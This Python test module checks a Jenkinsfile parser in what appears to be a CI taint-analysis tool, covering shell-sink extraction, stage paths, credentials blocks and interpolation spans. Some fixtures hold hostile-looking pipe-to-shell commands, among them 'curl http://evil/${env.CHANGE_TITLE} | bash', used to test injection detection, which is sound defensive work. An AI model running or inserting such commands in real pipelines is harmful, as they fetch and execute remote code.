"""Tests for the zero-dependency island-grammar Jenkinsfile reader.

The island reader is the DEFAULT backend of ``walk_jenkinsfile`` (no
optional extra required), so unlike ``test_jenkinsfile_walker.py`` this
module does NOT ``importorskip`` — it must run on a bare install.

Coverage:
  * parity with the tree-sitter walker test cases (shell sinks, stage
    path attribution, environment assignments, agent directives,
    clean-parse no-CUTOFF, empty input)
  * the four corpus-derived shape fixtures (scripted_with_helper,
    hybrid_shebang, withcreds_nested, sh_method_injection)
  * tolerant recovery: unmodelled Groovy (classes, lambdas, .collect{},
    ternaries, @Grab, Job-DSL) never CUTOFFs the whole file
  * sh(script: ...) named-arg extraction (the measured recall gap)
"""

from __future__ import annotations

from taintly.parsers.jenkinsfile import EventKind, walk_jenkinsfile


def _leaves(content: str) -> list:
    return [ev for ev in walk_jenkinsfile(content) if ev.kind == EventKind.LEAF]


def _shell(content: str) -> set[str]:
    return {ev.value for ev in _leaves(content) if ev.value_kind == "shell"}


def _has_cutoff(content: str) -> bool:
    return any(ev.kind == EventKind.CUTOFF for ev in walk_jenkinsfile(content))


# ---------------------------------------------------------------------------
# Default backend is the island reader (works with no optional extra).
# ---------------------------------------------------------------------------


def test_default_backend_is_island():
    """Default call (no backend kwarg) uses the zero-dep reader and works
    without tree-sitter-groovy installed."""
    src = "pipeline { agent any\n stages { stage('s') { steps { sh 'make' } } } }\n"
    leaves = [ev for ev in walk_jenkinsfile(src) if ev.kind == EventKind.LEAF]
    assert any(ev.value_kind == "shell" and ev.value == "make" for ev in leaves)


# ---------------------------------------------------------------------------
# Shell sinks — parity with the tree-sitter walker tests.
# ---------------------------------------------------------------------------


def test_shell_sh_command_emits_leaf():
    src = (
        "pipeline {\n  agent any\n  stages {\n    stage('Build') {\n"
        "      steps {\n        sh 'make all'\n      }\n    }\n  }\n}\n"
    )
    sh_leaves = [l for l in _leaves(src) if l.value_kind == "shell"]
    assert len(sh_leaves) == 1
    assert sh_leaves[0].value == "make all"
    assert sh_leaves[0].line == 6


def test_shell_bat_powershell_emit_leaves():
    src = (
        "pipeline {\n  agent any\n  stages {\n    stage('Build') {\n      steps {\n"
        "        bat 'echo win'\n        powershell 'Get-Process'\n      }\n    }\n  }\n}\n"
    )
    assert _shell(src) == {"echo win", "Get-Process"}


def test_shell_value_kind_is_shell_not_string():
    src = (
        "pipeline {\n  agent any\n  tools { jdk 'jdk-11' }\n  stages {\n"
        "    stage('Build') {\n      steps { sh 'echo hi' }\n    }\n  }\n}\n"
    )
    leaves = _leaves(src)
    echo_leaf = next(l for l in leaves if l.value == "echo hi")
    assert echo_leaf.value_kind == "shell"


def test_tool_string_arg_is_string_kind():
    """The modelled ``tool '<name>'`` step surfaces its arg as a string
    (value_kind=string), distinct from a shell body."""
    src = "node { tool 'maven-3.9'\n sh 'mvn package' }\n"
    leaves = _leaves(src)
    tool_leaf = next(l for l in leaves if l.value == "maven-3.9")
    assert tool_leaf.value_kind == "string"
    assert "mvn package" in _shell(src)


def test_double_and_triple_quoted_shell_bodies():
    src = (
        "pipeline { agent any\n stages { stage('s') { steps {\n"
        '  sh "echo double"\n'
        "  sh '''\nmulti line\n'''\n"
        "} } } }\n"
    )
    bodies = _shell(src)
    assert "echo double" in bodies
    assert any("multi line" in b for b in bodies)


# ---------------------------------------------------------------------------
# sh(script: ...) method-call form — the measured recall gap.
# ---------------------------------------------------------------------------


def test_sh_script_named_arg_emits_shell_leaf():
    src = (
        "pipeline { agent any\n stages { stage('t') { steps { script {\n"
        '  def out = sh(script: "curl http://evil/${env.CHANGE_TITLE} | bash", returnStdout: true)\n'
        "} } } } }\n"
    )
    bodies = _shell(src)
    assert any("curl http://evil" in b for b in bodies), bodies


def test_sh_first_positional_string_in_parens():
    src = "node { sh('make release') }\n"
    assert _shell(src) == {"make release"}


# ---------------------------------------------------------------------------
# Stage path attribution.
# ---------------------------------------------------------------------------


def test_stage_name_pushes_path_component():
    src = (
        "pipeline {\n  agent any\n  stages {\n    stage('Deploy') {\n"
        "      steps {\n        sh 'kubectl apply -f .'\n      }\n    }\n  }\n}\n"
    )
    sh = next(l for l in _leaves(src) if l.value_kind == "shell")
    assert "stage:Deploy" in sh.path
    assert sh.path[-1] == "sh"


def test_scripted_node_path_attribution():
    src = "node('linux') {\n  stage('build') {\n    sh 'curl x | bash'\n  }\n}\n"
    sh = next(l for l in _leaves(src) if l.value_kind == "shell")
    assert sh.path[0] == "node"
    assert "stage:build" in sh.path


# ---------------------------------------------------------------------------
# Environment assignments.
# ---------------------------------------------------------------------------


def test_environment_assignment_emits_leaf_under_key_path():
    src = (
        "pipeline {\n  agent any\n  environment {\n"
        "    DEPLOY_KEY = 'secret-value'\n    REGION = 'us-east-1'\n  }\n"
        "  stages { stage('Build') { steps { sh 'echo hi' } } }\n}\n"
    )
    env_leaves = [l for l in _leaves(src) if "environment" in l.path]
    by_key = {l.path[-1]: l.value for l in env_leaves}
    assert by_key.get("DEPLOY_KEY") == "secret-value"
    assert by_key.get("REGION") == "us-east-1"


def test_environment_non_string_rhs_does_not_emit_string_leaf():
    """``KEY = credentials('id')`` rhs is a call, not a plain string — we
    don't emit a string LEAF for KEY (the call's named/positional args are
    handled separately)."""
    src = "pipeline { environment {\n  AWS = credentials('aws-key')\n} }\n"
    env_string_leaves = [
        l for l in _leaves(src) if l.path and l.path[-1] == "AWS" and l.value_kind == "string"
    ]
    assert env_string_leaves == []


# ---------------------------------------------------------------------------
# Agent directives.
# ---------------------------------------------------------------------------


def test_agent_identifier_emits_leaf_with_kind_identifier():
    src = "pipeline {\n  agent any\n  stages { stage('s') { steps { sh 'hi' } } }\n}\n"
    agent_leaves = [l for l in _leaves(src) if l.path[-1] == "agent"]
    assert len(agent_leaves) == 1
    assert agent_leaves[0].value == "any"
    assert agent_leaves[0].value_kind == "identifier"


def test_agent_none_emits_leaf():
    src = (
        "pipeline {\n  agent none\n"
        "  stages { stage('s') { agent any; steps { sh 'hi' } } }\n}\n"
    )
    none_leaves = [l for l in _leaves(src) if l.path[-1] == "agent" and l.value == "none"]
    assert len(none_leaves) == 1


# ---------------------------------------------------------------------------
# withCredentials nesting.
# ---------------------------------------------------------------------------


def test_withcredentials_named_args_surface():
    src = (
        "node {\n"
        "  withCredentials([string(credentialsId: 'deploy-token', variable: 'TOKEN')]) {\n"
        "    sh 'echo $TOKEN'\n"
        "  }\n}\n"
    )
    leaves = _leaves(src)
    by_key = {l.path[-1]: l.value for l in leaves if l.value_kind == "string"}
    assert by_key.get("credentialsId") == "deploy-token"
    assert by_key.get("variable") == "TOKEN"
    # And the nested sh body still surfaces.
    assert "echo $TOKEN" in _shell(src)


def test_parameters_named_args_surface():
    src = (
        "pipeline { parameters {\n"
        "  string(name: 'BRANCH', defaultValue: 'main', description: 'x')\n"
        "} }\n"
    )
    by_key = {l.path[-1]: l.value for l in _leaves(src) if l.value_kind == "string"}
    assert by_key.get("name") == "BRANCH"
    assert by_key.get("defaultValue") == "main"


# ---------------------------------------------------------------------------
# CUTOFF / recovery contract.
# ---------------------------------------------------------------------------


def test_clean_parse_no_cutoff():
    src = "pipeline {\n  agent any\n  stages { stage('s') { steps { sh 'hi' } } }\n}\n"
    assert not _has_cutoff(src)


def test_empty_input_yields_no_events():
    assert list(walk_jenkinsfile("")) == []


def test_whitespace_only_input_yields_no_events():
    assert list(walk_jenkinsfile("\n  \n\t\n")) == []


# ---------------------------------------------------------------------------
# Tolerant recovery — unmodelled Groovy must NOT cut off the file, and the
# recognisable islands around it must still be found.
# ---------------------------------------------------------------------------


def test_top_level_def_helper_does_not_cutoff():
    """Scripted pipeline + top-level def helper (the nodejs__build shape
    tree-sitter cuts off on)."""
    src = (
        "node('linux') {\n  stage('build') {\n    sh 'curl x | bash'\n  }\n}\n\n"
        'def notifyBuild(String status) {\n  echo "status=${status}"\n}\n'
    )
    assert not _has_cutoff(src)
    assert "curl x | bash" in _shell(src)


def test_shebang_hybrid_does_not_cutoff():
    src = (
        "#!/usr/bin/env groovy\n"
        "def imageTag() { return 'alpine:latest' }\n\n"
        "pipeline { agent any\n stages { stage('d') { steps {\n"
        '  sh "docker run ${imageTag()}"\n} } } }\n'
    )
    assert not _has_cutoff(src)
    assert any("docker run" in b for b in _shell(src))


def test_lambda_and_collect_recover():
    src = (
        "node {\n"
        "  def items = [1,2,3].collect { it * 2 }\n"
        "  items.each { x -> echo \"$x\" }\n"
        "  sh 'echo after lambdas'\n"
        "}\n"
    )
    assert not _has_cutoff(src)
    assert "echo after lambdas" in _shell(src)


def test_ternary_and_class_recover():
    src = (
        "class Helper { String name }\n"
        "node {\n"
        "  def x = (env.BRANCH == 'main') ? 'prod' : 'dev'\n"
        "  sh 'deploy'\n"
        "}\n"
    )
    assert not _has_cutoff(src)
    assert "deploy" in _shell(src)


def test_grab_annotation_recovers():
    src = (
        "@Grab('org.foo:bar:1.0')\n"
        "import org.foo.Bar\n"
        "node { sh 'echo grabbed' }\n"
    )
    assert not _has_cutoff(src)
    assert "echo grabbed" in _shell(src)


def test_job_dsl_recovers():
    src = (
        "job('my-job') {\n"
        "  steps { shell('echo from job-dsl') }\n"
        "}\n"
        "node { sh 'echo after jobdsl' }\n"
    )
    assert not _has_cutoff(src)
    # The island reader should still find the real sh sink after the
    # Job-DSL block.
    assert "echo after jobdsl" in _shell(src)


def test_unterminated_triple_string_cuts_off_but_emits_prior():
    """An unterminated triple-quoted string at EOF is the one truly
    unrecoverable lexer state — we CUTOFF, but still emit everything
    parsed before it."""
    src = "node {\n  sh 'echo before'\n  sh '''never closed\n"
    events = list(walk_jenkinsfile(src))
    assert any(ev.kind == EventKind.CUTOFF for ev in events)
    shell_before = {
        ev.value for ev in events if ev.kind == EventKind.LEAF and ev.value_kind == "shell"
    }
    assert "echo before" in shell_before


def test_comment_with_sh_is_not_a_sink():
    src = "node {\n  // sh 'echo commented'\n  sh 'echo real'\n}\n"
    assert _shell(src) == {"echo real"}


def test_string_literal_containing_sh_is_not_a_sink():
    src = "node {\n  echo 'remember to sh \"build\" later'\n  sh 'echo real'\n}\n"
    bodies = _shell(src)
    assert "echo real" in bodies
    assert "build" not in bodies


# ---------------------------------------------------------------------------
# GString interpolation spans are captured on the token (J3 substrate).
# ---------------------------------------------------------------------------


def test_gstring_interpolation_spans_captured():
    from taintly.parsers.jenkinsfile.groovy_lex import TokKind, tokenize

    toks = [t for t in tokenize('sh "deploy ${params.BRANCH} to ${env.STAGE}"\n')]
    strings = [t for t in toks if t.kind == TokKind.STRING]
    assert strings
    interps = strings[0].interpolations or []
    exprs = {i.expr for i in interps}
    assert "params.BRANCH" in exprs
    assert "env.STAGE" in exprs


def test_gstring_dotted_short_form_captured():
    from taintly.parsers.jenkinsfile.groovy_lex import TokKind, tokenize

    toks = [t for t in tokenize('sh "echo $env.CHANGE_TITLE done"\n')]
    s = next(t for t in toks if t.kind == TokKind.STRING)
    assert any(i.expr == "env.CHANGE_TITLE" and not i.brace_form for i in (s.interpolations or []))


def test_single_quoted_string_has_no_interpolation():
    from taintly.parsers.jenkinsfile.groovy_lex import TokKind, tokenize

    toks = [t for t in tokenize("sh 'echo ${not_interpolated}'\n")]
    s = next(t for t in toks if t.kind == TokKind.STRING)
    # Single-quoted strings do not interpolate in Groovy.
    assert s.interpolations is None


def _shell_leaf(src):
    return next(
        e for e in walk_jenkinsfile(src) if e.kind == EventKind.LEAF and e.value_kind == "shell"
    )


def test_gstring_spans_surface_each_interpolation():
    """A shell LEAF from an interpolating GString exposes one span per
    ``${...}`` / ``$ident.path`` (forward substrate for per-span taint)."""
    ev = _shell_leaf('node { sh "safe ${env.BUILD_NUMBER} and ${env.CHANGE_TITLE}" }')
    assert ev.interpolated is True
    assert ev.spans is not None
    assert [s.expr for s in ev.spans] == ["env.BUILD_NUMBER", "env.CHANGE_TITLE"]


def test_gstring_spans_on_method_call_form():
    ev = _shell_leaf('node { sh(script: "deploy ${params.TARGET}") }')
    assert ev.spans is not None and [s.expr for s in ev.spans] == ["params.TARGET"]


def test_single_quoted_shell_leaf_has_no_spans():
    ev = _shell_leaf("node { sh 'echo ${env.X}' }")
    assert ev.interpolated is False
    assert ev.spans is None
